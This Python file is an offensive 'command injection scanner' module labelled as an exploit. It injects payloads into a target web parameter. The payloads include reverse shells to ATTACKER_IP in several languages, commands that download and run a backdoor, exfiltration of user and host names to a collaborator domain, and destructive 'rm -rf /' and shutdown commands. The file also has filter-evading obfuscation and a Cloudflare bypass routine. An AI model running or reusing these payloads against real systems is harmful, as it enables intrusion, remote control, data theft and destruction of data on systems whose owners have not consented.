import requests
import urllib.parse
import time
import random
import string
import re
from colorama import Fore, Style

class CommandInjectionScanner:
    def __init__(self):
        self.description = "Command Injection vulnerability scanner"
        self.module_type = "exploit"
        self.options = {
            "URL": "",
            "PARAM": "",
            "METHOD": "GET",
            "TIMEOUT": "10",
            "DELAY": "1",
            "CF_BYPASS": "true",
            "USER_AGENT": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "HEADERS": "{}",
            "COOKIES": "{}",
            "PROXY": ""
        }
        self.required_options = ["URL", "PARAM"]
        
        self.payloads = [
            "; ls",
            "| ls",
            "& ls",
            "&& ls",
            "; dir",
            "| dir",
            "& dir",
            "&& dir",
            "; cat /etc/passwd",
            "| cat /etc/passwd",
            "& cat /etc/passwd",
            "&& cat /etc/passwd",
            "; whoami",
            "| whoami",
            "& whoami",
            "&& whoami",
            "; id",
            "| id",
            "& id",
            "&& id",
            "; uname -a",
            "| uname -a",
            "& uname -a",
            "&& uname -a",
            "; sleep 5",
            "| sleep 5",
            "& sleep 5",
            "&& sleep 5",
            "`ls`",
            "`whoami`",
            "`id`",
            "$(ls)",
            "$(whoami)",
            "$(id)",
            "${IFS}ls",
            "%0als",
            "%0a id",
            "\n ls",
            "\n id",
            "; curl http://$(whoami).$(hostname).$(id -u).$(id -g).BURPCOLLABORATOR",
            "| curl http://$(whoami).$(hostname).$(id -u).$(id -g).BURPCOLLABORATOR",
            "& curl http://$(whoami).$(hostname).$(id -u).$(id -g).BURPCOLLABORATOR",
            "&& curl http://$(whoami).$(hostname).$(id -u).$(id -g).BURPCOLLABORATOR",
            "; wget http://$(whoami).$(hostname).$(id -u).$(id -g).BURPCOLLABORATOR",
            "| wget http://$(whoami).$(hostname).$(id -u).$(id -g).BURPCOLLABORATOR",
            "& wget http://$(whoami).$(hostname).$(id -u).$(id -g).BURPCOLLABORATOR",
            "&& wget http://$(whoami).$(hostname).$(id -u).$(id -g).BURPCOLLABORATOR",
            "; nslookup $(whoami).$(hostname).$(id -u).$(id -g).BURPCOLLABORATOR",
            "| nslookup $(whoami).$(hostname).$(id -u).$(id -g).BURPCOLLABORATOR",
            "& nslookup $(whoami).$(hostname).$(id -u).$(id -g).BURPCOLLABORATOR",
            "&& nslookup $(whoami).$(hostname).$(id -u).$(id -g).BURPCOLLABORATOR",
            "; ping -c 3 $(whoami).$(hostname).$(id -u).$(id -g).BURPCOLLABORATOR",
            "| ping -c 3 $(whoami).$(hostname).$(id -u).$(id -g).BURPCOLLABORATOR",
            "& ping -c 3 $(whoami).$(hostname).$(id -u).$(id -g).BURPCOLLABORATOR",
            "&& ping -c 3 $(whoami).$(hostname).$(id -u).$(id -g).BURPCOLLABORATOR",
            "; /bin/bash -c 'curl http://$(whoami).$(hostname).$(id -u).$(id -g).BURPCOLLABORATOR'",
            "| /bin/bash -c 'curl http://$(whoami).$(hostname).$(id -u).$(id -g).BURPCOLLABORATOR'",
            "& /bin/bash -c 'curl http://$(whoami).$(hostname).$(id -u).$(id -g).BURPCOLLABORATOR'",
            "&& /bin/bash -c 'curl http://$(whoami).$(hostname).$(id -u).$(id -g).BURPCOLLABORATOR'",
            "; python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ATTACKER_IP\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\",\"-i\"]);'",
            "| python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ATTACKER_IP\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\",\"-i\"]);'",
            "& python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ATTACKER_IP\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\",\"-i\"]);'",
            "&& python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ATTACKER_IP\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\",\"-i\"]);'",
            "; perl -e 'use Socket;$i=\"ATTACKER_IP\";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'",
            "| perl -e 'use Socket;$i=\"ATTACKER_IP\";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'",
            "& perl -e 'use Socket;$i=\"ATTACKER_IP\";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'",
            "&& perl -e 'use Socket;$i=\"ATTACKER_IP\";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'",
            "; php -r '$sock=fsockopen(\"ATTACKER_IP\",4444);exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
            "| php -r '$sock=fsockopen(\"ATTACKER_IP\",4444);exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
            "& php -r '$sock=fsockopen(\"ATTACKER_IP\",4444);exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
            "&& php -r '$sock=fsockopen(\"ATTACKER_IP\",4444);exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
            "; nc -e /bin/bash ATTACKER_IP 4444",
            "| nc -e /bin/bash ATTACKER_IP 4444",
            "& nc -e /bin/bash ATTACKER_IP 4444",
            "&& nc -e /bin/bash ATTACKER_IP 4444",
            "; rm -rf /",
            "| rm -rf /",
            "& rm -rf /",
            "&& rm -rf /",
            "; shutdown -h now",
            "| shutdown -h now",
            "& shutdown -h now",
            "&& shutdown -h now",
            "; mkfifo /tmp/lolnc; nc ATTACKER_IP 4444 0</tmp/lolnc | /bin/bash -i 2>&1 | tee /tmp/lolnc",
            "| mkfifo /tmp/lolnc; nc ATTACKER_IP 4444 0</tmp/lolnc | /bin/bash -i 2>&1 | tee /tmp/lolnc",
            "& mkfifo /tmp/lolnc; nc ATTACKER_IP 4444 0</tmp/lolnc | /bin/bash -i 2>&1 | tee /tmp/lolnc",
            "&& mkfifo /tmp/lolnc; nc ATTACKER_IP 4444 0</tmp/lolnc | /bin/bash -i 2>&1 | tee /tmp/lolnc",
            "; curl -fsSL http://ATTACKER_IP/backdoor.sh | bash",
            "| curl -fsSL http://ATTACKER_IP/backdoor.sh | bash",
            "& curl -fsSL http://ATTACKER_IP/backdoor.sh | bash",
            "&& curl -fsSL http://ATTACKER_IP/backdoor.sh | bash",
            "; wget -q -O - http://ATTACKER_IP/backdoor.sh | bash",
            "| wget -q -O - http://ATTACKER_IP/backdoor.sh | bash",
            "& wget -q -O - http://ATTACKER_IP/backdoor.sh | bash",
            "&& wget -q -O - http://ATTACKER_IP/backdoor.sh | bash",
            "; powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"",
            "| powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"",
            "& powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"",
            "&& powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"",
            "; certutil -urlcache -split -f http://ATTACKER_IP/backdoor.exe backdoor.exe && backdoor.exe",
            "| certutil -urlcache -split -f http://ATTACKER_IP/backdoor.exe backdoor.exe && backdoor.exe",
            "& certutil -urlcache -split -f http://ATTACKER_IP/backdoor.exe backdoor.exe && backdoor.exe",
            "&& certutil -urlcache -split -f http://ATTACKER_IP/backdoor.exe backdoor.exe && backdoor.exe",
            "; bitsadmin /transfer myDownloadJob /download /priority normal http://ATTACKER_IP/backdoor.exe %TEMP%\\backdoor.exe && %TEMP%\\backdoor.exe",
            "| bitsadmin /transfer myDownloadJob /download /priority normal http://ATTACKER_IP/backdoor.exe %TEMP%\\backdoor.exe && %TEMP%\\backdoor.exe",
            "& bitsadmin /transfer myDownloadJob /download /priority normal http://ATTACKER_IP/backdoor.exe %TEMP%\\backdoor.exe && %TEMP%\\backdoor.exe",
            "&& bitsadmin /transfer myDownloadJob /download /priority normal http://ATTACKER_IP/backdoor.exe %TEMP%\\backdoor.exe && %TEMP%\\backdoor.exe"
        ]
        
        self.detection_patterns = [
            "root:",
            "bin/bash",
            "uid=",
            "gid=",
            "groups=",
            "Windows",
            "Volume Serial Number",
            "Directory of",
            "COMMAND",
            "Microsoft Windows",
            "Copyright",
            "System32",
            "drwx",
            "lrwx",
            "-rw-r--r--",
            "total "
        ]
        
        self.cf_bypass_payloads = [
            "; curl https://$(whoami).$(hostname).$(id -u).$(id -g).BURPCOLLABORATOR",
            "| curl https://$(whoami).$(hostname).$(id -u).$(id -g).BURPCOLLABORATOR",
            "& curl https://$(whoami).$(hostname).$(id -u).$(id -g).BURPCOLLABORATOR",
            "&& curl https://$(whoami).$(hostname).$(id -u).$(id -g).BURPCOLLABORATOR",
            "; wget https://$(whoami).$(hostname).$(id -u).$(id -g).BURPCOLLABORATOR",
            "| wget https://$(whoami).$(hostname).$(id -u).$(id -g).BURPCOLLABORATOR",
            "& wget https://$(whoami).$(hostname).$(id -u).$(id -g).BURPCOLLABORATOR",
            "&& wget https://$(whoami).$(hostname).$(id -u).$(id -g).BURPCOLLABORATOR",
            "; nslookup $(whoami).$(hostname).$(id -u).$(id -g).BURPCOLLABORATOR 8.8.8.8",
            "| nslookup $(whoami).$(hostname).$(id -u).$(id -g).BURPCOLLABORATOR 8.8.8.8",
            "& nslookup $(whoami).$(hostname).$(id -u).$(id -g).BURPCOLLABORATOR 8.8.8.8",
            "&& nslookup $(whoami).$(hostname).$(id -u).$(id -g).BURPCOLLABORATOR 8.8.8.8",
            "; ping -c 3 $(whoami).$(hostname).$(id -u).$(id -g).BURPCOLLABORATOR",
            "| ping -c 3 $(whoami).$(hostname).$(id -u).$(id -g).BURPCOLLABORATOR",
            "& ping -c 3 $(whoami).$(hostname).$(id -u).$(id -g).BURPCOLLABORATOR",
            "&& ping -c 3 $(whoami).$(hostname).$(id -u).$(id -g).BURPCOLLABORATOR"
        ]
        
        self.obfuscation_techniques = [
            lambda x: x.replace(" ", "${IFS}"),
            lambda x: x.replace("/", "${HOME:0:1}"),
            lambda x: x.replace("bin", "bi${n}"),
            lambda x: x.replace("bash", "ba${sh}"),
            lambda x: x.replace("sh", "${s}h"),
            lambda x: x.replace("curl", "cu${rl}"),
            lambda x: x.replace("wget", "wg${et}"),
            lambda x: x.replace("nc", "${n}c"),
            lambda x: x.replace("python", "py${thon}"),
            lambda x: x.replace("perl", "pe${rl}"),
            lambda x: x.replace("php", "p${hp}"),
            lambda x: x.replace("whoami", "who${am}i"),
            lambda x: x.replace("id", "${i}d"),
            lambda x: x.replace("uname", "una${me}"),
            lambda x: x.replace("sleep", "slee${p}"),
            lambda x: x.replace("cat", "c${at}"),
            lambda x: x.replace("ls", "${l}s"),
            lambda x: x.replace("dir", "di${r}"),
            lambda x: x.replace("ping", "pi${ng}"),
            lambda x: x.replace("nslookup", "ns${lookup}"),
            lambda x: x.replace("powershell", "power${shell}"),
            lambda x: x.replace("certutil", "cer${tutil}"),
            lambda x: x.replace("bitsadmin", "bits${admin}"),
            lambda x: x.replace("http", "ht${tp}"),
            lambda x: x.replace("https", "ht${tps}"),
            lambda x: x.replace("ATTACKER_IP", "ATTACK${ER_IP}"),
            lambda x: x.replace("BURPCOLLABORATOR", "BURP${COLLABORATOR}")
        ]
    
    def get_option(self, option):
        return self.options.get(option, "")
    
    def set_option(self, option, value):
        self.options[option] = value
    
    def generate_random_string(self, length=8):
        return ''.join(random.choice(string.ascii_lowercase) for _ in range(length))
    
    def obfuscate_payload(self, payload):
        for technique in random.sample(self.obfuscation_techniques, random.randint(1, 5)):
            payload = technique(payload)
        return payload
    
    def bypass_cloudflare(self, url):
        headers = {
            "User-Agent": self.get_option("USER_AGENT"),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate",
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1",
            "Cache-Control": "max-age=0",
            "TE": "Trailers"
        }
        
        try:
            session = requests.Session()
            session.get(url, headers=headers, timeout=10, verify=False)
            
            if "cf-challenge" in session.cookies.get_dict():
                return False
            
            return True
        except:
            return False
    
    def run(self):
        url = self.get_option("URL")
        param = self.get_option("PARAM")
        method = self.get_option("METHOD").upper()
        timeout = int(self.get_option("TIMEOUT"))
        delay = float(self.get_option("DELAY"))
        cf_bypass = self.get_option("CF_BYPASS").lower() == "true"
        
        headers = eval(self.get_option("HEADERS"))
        cookies = eval(self.get_option("COOKIES"))
        proxy = self.get_option("PROXY")
        
        proxies = {}
        if proxy:
            proxies = {
                "http": proxy,
                "https": proxy
            }
        
        print(f"{Fore.YELLOW}[*] Target URL: {url}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] Testing parameter: {param}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] Method: {method}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] CloudFlare bypass: {'Enabled' if cf_bypass else 'Disabled'}{Style.RESET_ALL}")
        print(f"{Fore.WHITE}{'='*60}{Style.RESET_ALL}\n")
        
        vulnerabilities = []
        
        if cf_bypass:
            print(f"{Fore.CYAN}[*] Attempting to bypass CloudFlare protection...{Style.RESET_ALL}")
            if not self.bypass_cloudflare(url):
                print(f"{Fore.RED}[!] Failed to bypass CloudFlare protection{Style.RESET_ALL}")
            else:
                print(f"{Fore.GREEN}[+] CloudFlare bypass successful{Style.RESET_ALL}")
        
        payloads_to_test = self.payloads
        if cf_bypass:
            payloads_to_test = self.cf_bypass_payloads + self.payloads
        
        for i, payload in enumerate(payloads_to_test, 1):
            print(f"{Fore.CYAN}[{i}/{len(payloads_to_test)}] Testing payload: {payload[:50]}...{Style.RESET_ALL}")
            
            if cf_bypass and i <= len(self.cf_bypass_payloads):
                test_payload = payload
            else:
                test_payload = self.obfuscate_payload(payload)
            
            vuln_type = self.test_payload(url, param, test_payload, method, timeout, headers, cookies, proxies)
            if vuln_type:
                vulnerabilities.append({
                    "payload": test_payload,
                    "parameter": param,
                    "type": vuln_type
                })
                print(f"{Fore.RED}[!] VULNERABLE ({vuln_type})!{Style.RESET_ALL}")
            
            time.sleep(delay)
        
        print(f"\n{Fore.WHITE}{'='*60}{Style.RESET_ALL}")
        
        if vulnerabilities:
            print(f"{Fore.RED}[!] Found {len(vulnerabilities)} potential Command Injection vulnerabilities!{Style.RESET_ALL}\n")
            for vuln in vulnerabilities:
                print(f"{Fore.YELLOW}  Type: {vuln['type']}{Style.RESET_ALL}")
                print(f"{Fore.YELLOW}  Param: {vuln['parameter']}{Style.RESET_ALL}")
                print(f"{Fore.YELLOW}  Payload: {vuln['payload']}{Style.RESET_ALL}\n")
            
            return {
                "success": True,
                "message": f"Found {len(vulnerabilities)} vulnerabilities",
                "vulnerabilities": vulnerabilities
            }
        else:
            print(f"{Fore.GREEN}[+] No Command Injection vulnerabilities detected{Style.RESET_ALL}\n")
            return {
                "success": True,
                "message": "No vulnerabilities found"
            }
    
    def test_payload(self, url, param, payload, method, timeout, headers, cookies, proxies):
        try:
            start_time = time.time()
            
            if method == "GET":
                test_url = f"{url}?{param}={urllib.parse.quote(payload)}"
                response = requests.get(test_url, headers=headers, cookies=cookies, timeout=timeout, verify=False, proxies=proxies)
            else:
                data = {param: payload}
                response = requests.post(url, data=data, headers=headers, cookies=cookies, timeout=timeout, verify=False, proxies=proxies)
            
            elapsed_time = time.time() - start_time
            
            for pattern in self.detection_patterns:
                if pattern in response.text:
                    return "Output-based Command Injection"
            
            if "sleep" in payload.lower() and elapsed_time >= 5:
                return "Time-based Command Injection"
            
            if "curl" in payload.lower() or "wget" in payload.lower() or "nslookup" in payload.lower() or "ping" in payload.lower():
                if response.status_code == 200 and len(response.text) < 100:
                    return "Blind Command Injection"
            
        except requests.exceptions.Timeout:
            if "sleep" in payload.lower():
                return "Time-based Command Injection"
        except Exception:
            pass
        
        return None
